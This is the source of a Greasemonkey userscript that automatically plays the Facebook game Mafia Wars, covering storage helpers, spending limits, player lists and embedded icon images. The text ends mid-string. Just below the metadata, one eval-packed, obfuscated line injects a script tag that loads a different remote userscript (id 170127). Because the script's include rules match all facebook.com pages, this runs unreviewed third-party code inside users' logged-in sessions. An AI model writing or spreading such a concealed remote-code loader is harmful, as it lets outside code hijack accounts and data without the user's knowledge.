/**
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* any later version.

* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.

* You should have received a copy of the GNU General Public License
* along with this program. If not, see <http://www.gnu.org/licenses/>.
* All images copyright PlayerScripts.com. All rights reserved. 2010
*/

/**
* @package: Facebook Mafia Wars Autoplayer
* @authors: KCMCL, Bushdaka, crazydude, cygnum, rasmoe, Lister, SamTheButcher, MaxJ, donnaB,
            billy_bob, Cam, janmillsjr, nonoymsd
* @past_authors: CharlesD, Eric Ortego, Jeremy, Liquidor, AK17710N, KCMCL,
            Fragger, <x51>, CyB, int1, Janos112, int2str, Doonce, Eric Layne,
            Tanlis, Cam, vmzildjian, csanbuenaventura, Scrotal, Bushdaka,
            rdmcgraw, moe, crazydude, SamTheButcher, dwightwilbanks,
            nonoymsd, MaxJ, donnaB, StevenD, b4sanjay
* @created: March 23, 2009
* @credits: Blannies Vampire Wars script
            http://userscripts.org/scripts/show/36917
*/

// ==UserScript==
// @name        PS Facebook Mafia Wars Autoplayer Plus + Last Update
// @namespace   mafiawars
// @description Autoplayer for the facebook application - Mafia Wars
// @include     http://facebook.mafiawars.com/mwfb/remote/html_server.php*
// @include     http://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     http://apps.facebook.com/inthemafia/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include     http://apps.new.facebook.com/inthemafia/*
// @include     http://www.facebook.com/connect/uiserver*
// @exclude     http://mwfb.zynga.com/mwfb/*#*
// @exclude     http://facebook.mafiawars.com/mwfb/*#*
// @version     1.1.703
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// search for new_header   for changes
//
// TestChanges    <- new questionable changes can have the option to be disabled using this (look for checkbox on about tab)
// if (isGMChecked(TestChanges)){ code };
// else { original code };    <- optional
// once code is proven ok, take it out of testing
//
var SCRIPT = {
  version: '1.1.703',
  name: 'inthemafia',
  appID: 'app10979261223',
  appNo: '10979261223',
  ajaxPage: 'ajax_inner',     // <div> for Autoplay for parsing with logResponse(), added as inner_page sibling
  ajaxResult: 'ajax_result',  // <div> for parsing with logJSONResponse(), added as final_wrapper sibling
   presentationurl: 'http://userscripts.org/scripts/show/59820',
  url: 'http://www.playerscripts.com/rokdownloads/ps_facebook_mafia_wars_a.user.js',
  metadata: 'http://userscripts.org/scripts/source/59820.meta.js',
  controller: 'remote/html_server.php?xw_controller=',
  action: '&xw_action=',
  city: '&xw_city=',
  opponent: '&opponent_id=',
  user: '&user_id='
};

// Set the storage path
var GMSTORAGE_PATH = 'GM_' + SCRIPT.appID + '_';
if (/facebook\.com/.test(window.location.href)) {
  var profElt = xpathFirst('//ul[@id="pageNav"]//a[@accesskey="6"]');
  if (profElt && profElt.getAttribute('href').match(/id=(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }

  var profLink = xpathFirst('//div[contains(@id,"div_story_") and contains(@data-ft,"actrs")]');
  if (profLink && profLink.getAttribute('data-ft').match(/"actrs":"(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }
}

if (/mwfb\.zynga\.com/.test(window.location.href)) {
  var docUrl = document.location.href;
  if (docUrl.match(/sf_xw_user_id=(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }
}

var gvar=function() {}; // Global variables
function GM_ApiBrowserCheck() {
  var needApiUpgrade=false;
  if(typeof(unsafeWindow)=='undefined') { unsafeWindow=window; }
  if(typeof(GM_log)=='undefined') { GM_log=function(msg) { try { unsafeWindow.console.log('GM_log: '+msg); } catch(e) {} }; }

  if(typeof(GM_setValue)!='undefined') {
    var gsv=GM_setValue.toString();
    if(gsv.indexOf('staticArgs')>0) { gvar.isGreaseMonkey=true; GM_log('GreaseMonkey Api detected...'); } // test GM_hitch
    else if(/not\s+supported/.test(gsv)) { needApiUpgrade=true; gvar.isBuggedChrome=true; GM_log('Bugged Chrome GM Api detected...'); }
  } else { needApiUpgrade=true; GM_log('No GM Api detected...'); }

  if(needApiUpgrade) {
    GM_log('Try to recreate needed GM Api...');
    GM_log('Using [' +  GMSTORAGE_PATH  + '] as storage path.');
    var ws=null; try { ws=typeof(unsafeWindow.localStorage); unsafeWindow.localStorage.length; } catch(e) { ws=null; } // Catch Security error
    if(ws=='object') {
      GM_log('Using localStorage for GM Api.');
      GM_getValue=function(name,defValue) { var value=unsafeWindow.localStorage.getItem(GMSTORAGE_PATH+name); if(value==null) { if (defValue==null) { return 'undefined'; } else { return defValue; } } else { switch(value.substr(0,2)) { case 'S]': return value.substr(2); case 'N]': return parseInt(value.substr(2)); case 'B]': return value.substr(2)=='true'; } } return value; };
      GM_setValue=function(name,value) { switch (typeof(value)) { case 'string': unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'S]'+value); break; case 'number': if(value.toString().indexOf('.')<0) { unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'N]'+value); } break; case 'boolean': unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'B]'+value); break; } };
      GM_deleteValue=function(name) { unsafeWindow.localStorage.removeItem(GMSTORAGE_PATH+name); };
    } else if(!gvar.isOpera || typeof(GM_setValue)=='undefined') {
      GM_log('Using temporarilyStorage for GM Api.'); gvar.temporarilyStorage=new Array();
      GM_getValue=function(name,defValue) { if(typeof(gvar.temporarilyStorage[GMSTORAGE_PATH+name])=='undefined') { return defValue; } else { return gvar.temporarilyStorage[GMSTORAGE_PATH+name]; } };
      GM_setValue=function(name,value) { switch (typeof(value)) { case "string": case "boolean": case "number": gvar.temporarilyStorage[GMSTORAGE_PATH+name]=value; } };
      GM_deleteValue=function(name) { delete gvar.temporarilyStorage[GMSTORAGE_PATH+name]; };
    }
    if(typeof(GM_openInTab)=='undefined') { GM_openInTab=function(url) { unsafeWindow.open(url,""); }; }
    if(typeof(GM_registerMenuCommand)=='undefined') { GM_registerMenuCommand=function(name,cmd) { GM_log("Notice: GM_registerMenuCommand is not supported."); }; } // Dummy
    if(!gvar.isOpera || typeof(GM_xmlhttpRequest)=='undefined') {
      GM_log('Using XMLHttpRequest for GM Api.');
      GM_xmlhttpRequest=function(obj) {
        var request=new XMLHttpRequest();
        request.onreadystatechange=function() { if(obj.onreadystatechange) { obj.onreadystatechange(request); } if(request.readyState==4 && obj.onload) { obj.onload(request); } };
        request.onerror=function() { if(obj.onerror) { obj.onerror(request); } };
        try { request.open(obj.method,obj.url,true); } catch(e) { if(obj.onerror) { obj.onerror( {readyState:4,responseHeaders:'',responseText:'',responseXML:'',status:403,statusText:'Forbidden'} ); }; return; }
        if(obj.headers) { for(name in obj.headers) { request.setRequestHeader(name,obj.headers[name]); } }
        request.send(obj.data); return request;
  }; } }
}
GM_ApiBrowserCheck();

// Handle Publishing (check for FB publishing iframe)
function checkInPublishPopup() {
  if (xpathFirst('//div[contains(@class,"aid_' + SCRIPT.appNo +'")]') &&
      /connect\/uiserver/.test(window.location.href)) {
    setGMTime('postTimer', '00:10');
    window.setTimeout(handlePublishing, 3000);
    return true;
  }
  return false;
}

function fetchPubOptions() {
  copyMWValues(['isRunning', 'autoGiftSkipOpt', 'autoLottoOpt', 'autoSecretStash',
                'autoIcePublish', 'autoLevelPublish', 'autoAchievementPublish',
                'autoAskJobHelp', 'autoShareWishlist', 'autoWarRewardPublish',
                'autoWarResponsePublish', 'autoWarRallyPublish', 'autoWarPublish']);
}

function managePopups() {
  // Refresh the publishing options
  fetchPubOptions();
  // Handle more popups that just show up out of nowhere
  handlePopups();
  window.setTimeout(managePopups, 3000);
}

// Load the iframe
function checkLoadIframe() {
  var iFrameCanvas = xpathFirst('//iframe[@name="mafiawars"]');
  if (iFrameCanvas) {
    setFBParams();
    window.location.replace(iFrameCanvas.src);
    return true;
  }
  return false;
}

// Register debugOnOff with Greasemonkey
if (gvar.isGreaseMonkey) {
  GM_registerMenuCommand('FB Mafia Wars Autoplayer - Turn Debugging Log On/Off', debugOnOff);
  GM_registerMenuCommand('FB Mafia Wars Autoplayer - Clear Saved Values', function() { clearSettings(); loadHome(); });
  GM_registerMenuCommand('FB Mafia Wars Autoplayer - Display Stats Window', function() { toggleStats(); });
}

//
// Define Spend object and methods.
//

// Constructor for Spend objects.
function Spend(name, spendFlag, startFlag, keepMode, keepValue,
               useMode, useValue, icon, burnFlag, lastFloor, lastCeiling) {
  // Initialize GM name containers
  this.name = name;
  this.spendFlag = spendFlag;
  this.startFlag = startFlag;
  this.burnFlag = burnFlag;
  this.keepMode = keepMode;
  this.keepValue = keepValue;
  this.useMode = useMode;
  this.useValue = useValue;
  this.lastFloor = lastFloor;
  this.lastCeiling = lastCeiling;
  this.icon = icon;
  this.canBurn = false;

  // Calculate the spend limit
  this.getSpendValue = function (maxVal, spendMode, spendValue) {
    switch (parseInt(spendMode)) {
      case SCHEME_PERCENT: return Math.round(maxVal * parseInt(spendValue) * .01);
      case SCHEME_POINTS: return parseInt(spendValue);
    }
  };
}

// Update the upper and lower limits of spending
Spend.prototype.refreshLimits = function (maxVal, canLevel) {
  // Subtract one or else spending will never run.
  this.floor   = Math.min(this.getSpendValue (maxVal,
                                              GM_getValue(this.keepMode, 0),
                                              GM_getValue(this.keepValue, 0)),
                          maxVal - 1);

  // The max value is the limit for ceiling
  this.ceiling = Math.min(this.getSpendValue (maxVal,
                                              GM_getValue(this.useMode, 0),
                                              GM_getValue(this.useValue, 0)),
                          maxVal);

  // Check if burning is enabled
  this.canBurn = isGMChecked(this.burnFlag) && canLevel;
};

// Toggle spending accordingly and log changes
Spend.prototype.toggleSpending = function (maxVal, curVal) {
  // Log any change to the floor.
  if (this.floor != GM_getValue(this.lastFloor)) {
    GM_setValue(this.lastFloor, this.floor);
    if (this.floor > 1) {
      addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> ' + this.name +
               ' is set to keep above <strong>' + this.floor + '</strong>.</span>');
    }
  }

  // Log any change to the ceiling.
  if (this.ceiling != GM_getValue(this.lastCeiling)) {
    GM_setValue(this.lastCeiling, this.ceiling);
    if (this.ceiling > this.floor) {
      addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> ' + this.name +
               ' refill level set to <strong>' + this.ceiling + '</strong>.</span>');
    }
  }

  // Determine whether spending needs to start or stop.
  if (curVal >= this.ceiling && !GM_getValue(this.startFlag)) {
    GM_setValue(this.startFlag, true);
  } else if (curVal <= this.floor && this.ceiling > this.floor &&
             GM_getValue(this.startFlag)) {
    GM_setValue(this.startFlag, false);
    addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> Refilling ' + this.name +
             ' to <strong>' + this.ceiling + '</strong>.</span>');
  }
};

//
// Define Player object and methods.
//

// Determine whether two player objects refer to the same player.
Player.prototype.match = function(player) {
  if (!player) return false;
  if (this.id && player.id)
    return (this.id == player.id);
  if (this.profile && this.profile == player.profile)
    return true;
  if (this.profileAttack && this.profileAttack == player.profileAttack)
    return true;
  if (this.attack && this.attack == player.attack)
    return true;
  return false;
};

// Update this player object's properties with the properties of another.
Player.prototype.update = function(player) {
  if (!this.match(player)) return false;
  for (var prop in player) {
    this[prop] = player[prop];
  }
  return true;
};

// Constructor for Player objects.
function Player(name) {
}

//
// Define PlayerList object and methods.
//

// Get this player list's array of player objects.
PlayerList.prototype.get = function(forceRefresh) {
  if (this.name && (forceRefresh || !this.list.length)) {
    // Load the list from storage.
    var ids = getSavedList(this.name);

    // Convert the ID list (strings) into a player list (objects).
    this.list = [];
    for (var i = 0, l=ids.length; i < l; ++i) {
      var p = new Player();
      p.id = ids[i];
      this.list.push(p);
    }
  }

  return this.list;
};

PlayerList.prototype.set = function(list) {
  if (list) {
    this.list = list;
  }

  if (this.name) {
    // Build an array of player ID's.
    var a = [];
    for (var i = 0, l=this.list.length; i < l; ++i) {
      var player = this.list[i];
      if (player && player.id) {
        a.push(player.id);
      }
    }

    // Store the list.
    setSavedList(this.name, a);
  }
};

PlayerList.prototype.add = function(player, max) {
  if (!player) return false;

  // If the player is already in the list, just update it.
  var l = this.list.length;
  for (var i = 0; i < l; ++i) {
    if (this.list[i].update(player)) {
      return false;
    }
  }

  // No match. Just push it into the array.
  this.list.push(player);

  // Shorten the array if it has become too large.
  if (max > 0) {
    while (max < this.list.length) {
      var playerItem = this.list.shift();
      DEBUG('Removed player ' + playerItem.id + ' from ' + this.name + '.');
    }
  }

  return true;
};

PlayerList.prototype.remove = function(player) {
  if (!player) return false;

  // If the player is in the list, remove it.
  var l = this.list.length;
  for (var i = 0; i < l; ++i) {
    if (this.list[i].match(player)) {
      this.list.splice(i, 1);
      return true;
    }
  }

  // No match.
  return false;
};

PlayerList.prototype.indexOf = function(player) {
  var l = this.list.length;
  for (var i = 0; i < l; i++) {
    if (this.list[i].match(player))
      return i;
  }
  return -1;
};

PlayerList.prototype.debug = function() {
  var l = this.list.length;
  var str = 'PlayerList name=' + this.name + ', length=' + l + '\n';
  for (var i = 0; i < l; ++i) {
    var p = this.list[i];
    str += i + ': id=' + p.id;
    if (p.name) str += ', name=' + p.name;
    if (p.level) str += ', level=' + p.level;
    if (p.mafia) str += ', mafia=' + p.mafia;
    str += '\n';
  }
  return str;
};

// Constructor for PlayerList objects.
function PlayerList(name) {
  this.name = name;
  this.list = [];
  this.get();
}

//create data uris for mini icon usage
var searchIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACLElEQVR42mNkgIJ12/cacLCzlTIwMtkwMzNx/Pnz58qfP3/n+Ls5LGfAAxhBxMZdBxKFBflnqirKs4oKCTAwMjIyfP/xk+HmvYcMj54+X/n9x4/o' +
    'CD+Pv1gNWLVlp6GYiMhJQ20NVm4uDoTMfwaGf///MZy5fIPh9Zs3tf5uji1YDdi67/BSaUnJKDUFGQYmJiaw7SDd//79Z/j77x/Di9fvGO4+ePTh4+fP4mE+br8wDNh+4OhDTRVlOUF+XgYOdlaIAUDbQZp//vrN' +
    '8OrtB4b3Hz8yPHzy1BhowDkMA3YePPZCR0NNnJebk4GdlRXsiv9A+PfvP4Yv374zfPryjeHdhw+gsLAK9nQ+js0Lewy1NZ15ebgYWFlYGFiYmcDO//P3L8M3YEB+/faD4eHTp3+ePH8pFuXv+R7DAGD0hasoyK1Q' +
    'lkeEwf//EBf8+PWL4e37jwy37z9Y7uNsF4UvGherKcnHyEtLMjAzM4MNALng5Zt3DM9fvWa4/+BhSWyIfy9OAxav28LEy81VwsvDUyolLioCcsW7Dx9/vf/4adWLl6+vXzt/qmXz+rWHGJmYfG7evPkFwwAYmL96' +
    'IwsTI6MG0BXsQFfcjg3y+QQSNzO3OMzLL2Dz9OH9o0A/ety4ceMLVgNwAR1tbT5efv4dXDx8lk8fPTgKFPIEGvKZaAMghmgBDRHAMIRoA3AZQpIBUEN4gYbsBBny8O7tvSQbAA0TXg4u7g2fP33YBwCb9/irlkMH' +
    '+QAAAABJRU5ErkJgggo=' +
    '" />';

var lootbagIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEwAQANU/AGtsbqeoqpKTk1FRU05OT0lJS2RkZVtbXM7P0Tc3N5+gonR1d0A/QGBgYldXWGdpajw7PEVERbGxsmRlZ4+PkJCRk3Bxc31/gV1fYGJiZF1dX1RUVdHS1Hp8fjo5OkJCRFBQUUdHSD8+P7S1' +
    't2JjZXRzdcbIyY6QknZ4en+Bg7S3uYOFiIqLjExMTLm6vIGDhmZnaL6/wVBRU3p6e5mbnZaXmWlqbJqanGprbauusERCRDU0NFlZW25wckFAQVJSUiH5BAEAAD8ALAAAAAATABAAAAbgwJ/QQBmNBDODcMn88WoI' +
    'ScnnKFFuNWXTQctNfDAJZ8xxKRaNw/JS2fhQqpgJoXD4GhTKwVEYoAw+EzUKAQEHYDEsLTsJEBAREzw+ACksbT4WARs7jB4QPjoEET4HFgsAPjwni50QDA0hD5IEIRuSBgCcCZ4MHwsFsoE9GW4gDq29ER0twRM9' +
    'zz4gAwmNyQUdBM3PPakkjSIfESHX2TA+ONvdECI+4gUEHQMaDT49Ky8LqQbsETINz8R+DGihAcCCC3e+OLBg48AAaQOa8PiiYcIHAu+kNWkywAGGdxGbBAEAOw==' +
    '" />';

var playIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAMQAAAAAAP///4i1GpXCHJO/G5C9G4u4Goq2GpnGHZTBHI26G4eyGpzJHa3aIafVIKfUIKHOH5/NH6vYIaTSILPgIq7bIbLfIrHeIv3++f///wAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABkALAAA' +
    'AAAQABAAAAVqYBZB0+NITVpdl0VRDDOWZ9qsLYXEs4mqLMtgJyP5bCtLYsjDYI5AwpLofNZUBSmzav01FNkpt5sygLVjGspgDnN7p8OhTajyjA45G+xkFksLAnpnU3cTC4GDYX4jiIlzhIwZjoKQizsZIQA7' +
    '" />';

var infoIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAALISURBVDhPjZPdS1NhHMc3DCmMCKRbJaQI1Jus64K6' +
    'iQqS/oCSbr3yQnyZrSa+dKEDXyAhvFDRtqaQIakzB3sxdcPt1Dbnyzan29nmXM1tZ+fMs3O+PWezC7XAA7+L5/B8Pt/n95zfkctOPQYDLopisjyX48qLilBydHQkY5g0I4p8IJO5Eqiru86dZo7XkO/uitVra9zY' +
    '9jZH0TSXiERYnqYZPhBIJVZXaUqnWxubmVmvJoD8hARAsdstdASDfFIQAKlYLgdqMw4HqWQqh3gciEQAo9F/ODFhbtdqncV5CYHlNhteHhwI3F+Y5wEztY/KZzpU1epgsu8jGgX29oCdHQHLy2G2t3f0hcTKLJZs' +
    'lc/Hu8kinyzBLAuQrjG+EMLQlwDivwSEw0AgAGxuShJgctLmUigGKmUmE/M0FuNZUQRyuQLMZoDhBRpvNF506vzw7x0hFAL8fsDjAZxOwGLxZlSq/ieyxcWD59EoOb3UN4FTKSDDkITlOO4qHLjf/hNuL5dP39oq' +
    'wHa7iKWlTb6tradWNj1N3/P7mShDIAk+PCzUNp1FjdKD2689oDay8PkK6RQFbGxILVi8TU1tNTKHQywxGMLv4/EskkkgkSAiIvhEcah4F0ZFdwQT37Pwkt6ldOkOrNaQqFB0Nmu12qL8l9DrQ2Um066dtJIXpH8D' +
    'j7UsSvvTKB1I49E4C+86QMKIII7BwY/f1Gr11ROzYDTS17TaVZXVGvR51mM87UshtsMhuMXBv0FmwgHYbALMZhfT0tJV+89pNBgMF8bHV+5oNEuvpqZWPpCaHhmZM+n1W2mrVSB3kMPw8Ge7SqW68Z9xPvtaqey7' +
    'pdNZfrhcWczOUrnGxta6c8PSxtbWrofz887Y3JxL6Orq0/T09Fw6r0De3T1U1tEx+FWtHnXU1zfWK5UDl88LS/vygubmtw8aGhpunvkDj01/AJKaSKGsr24+AAAAAElFTkSuQmCC' +
    '" />';

var attackIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AKJRAP/LNP/dNP/KIv2uAMmHAOyXAP/pfP/eQ7VkAfisAEA8LOWNAP+9CkgkDeejAIhIA92OAP/ODmtEDf/EAf+9ADErHF02Df/PE/y3ALVrAGMyCv/mhk9LLyccFhsYGf/TJaeRO9PCav/f' +
    'YqeWLP/UE//hRv+0DvC6QqeDDrWiHPecAP/GCtGeAoVXCvDcXKebSdOwWLF3CP/ic//sdvWnAIRuDWMtB3toDXYuAnU/CqJgAm9KDXBZDXtrLf///yH5BAEAAD8ALAAAAAANAA0AAAZ3wJ+wAxP+FiqjkkY6vnBK' +
    '48HkEwl6xo4UIUCUbEJLaMbhjEASTBrd+qUGgQGLQs8UIB6hb9Co+CsPOx9CCzEBDRmJCg8FPEcoJzU1BAQ1ERo7Gi4yExc8BgYMEQk3Dg4bSisJEAkADlFCDDkfF66wFgl5PzqoQkEAOwo=' +
    '" />';

var defenseIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AFFzrH2m60V0ukhrpazH/CQ0TYuv8U19yVeK3Cc7Wl+Q4F2O3S1MfFCAzBgdJRsjMjtinj9loVp4r22a52aFvzlPdIGYwk2AzneUzVN/x2iDt8ja/ZS29mOAtT9dj9Pi/jFShI6hxHef6G2N' +
    'x0VdiDlLaePs/rrR/SxEaaWwxYCh4lWH1198slqJ1mN5oqLA93uSv05ihUJkm0JusF+IyzRdm22b6DdfnGWV5HSg7YKq9Hul8Iiv+K/J/M3e/v///yH5BAEAAD8ALAAAAAANAA0AAAZ4wJTp4ysaiwRMaHPqOZ9O' +
    'lcZC4PCu2OuoA3txdOAwmMJycQy7tHonkkhiBkNuTs/hAKRSIDCx+f0TNAAVDjiGh4YKAAMFPx4tCwqSCgsZAzI/Pw8HDSsInw0REQmZPygzAgcXAhAQDKWZCTezswwOsJkPDDUgjaVBADsK' +
    '" />';

var closeButtonIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var updateGoodIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGrSURBVDjLvZPZLkNhFIV75zjvYm7VGFNCqoZUJ+ro' +
    'KUUpjRuqp61Wq0NKDMelGGqOxBSUIBKXWtWGZxAvobr8lWjChRgSF//dv9be+9trCwAI/vIE/26gXmviW5bqnb8yUK028qZjPfoPWEj4Ku5HBspgAz941IXZeze8N1bottSo8BTZviVWrEh546EO03EXpuJOdG63' +
    'otJbjBKHkEp/Ml6yNYYzpuezWL4s5VMtT8acCMQcb5XL3eJE8VgBlR7BeMGW9Z4yT9y1CeyucuhdTGDxfftaBO7G4L+zg91UocxVmCiy51NpiP3n2treUPujL8xhOjYOzZYsQWANyRYlU4Y9Br6oHd5bDh0bCpSO' +
    'ixJiWx71YY09J5pM/WEbzFcDmHvwwBu2wnikg+lEj4mwBe5bC5h1OUqcwpdC60dxegRmR06TyjCF9G9z+qM2uCJmuMJmaNZaUrCSIi6X+jJIBBYtW5Cge7cd7sgoHDfDaAvKQGAlRZYc6ltJlMxX03UzlaRlBdQr' +
    'zSCwksLRbOpHUSb7pcsnxCCwngvM2Rm/ugUCi84fycr4l2t8Bb6iqTxSCgNIAAAAAElFTkSuQmCC' +
    '" />';

var pausedMessageImage = '<img src="data:image/png;base64,' +
    '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' +
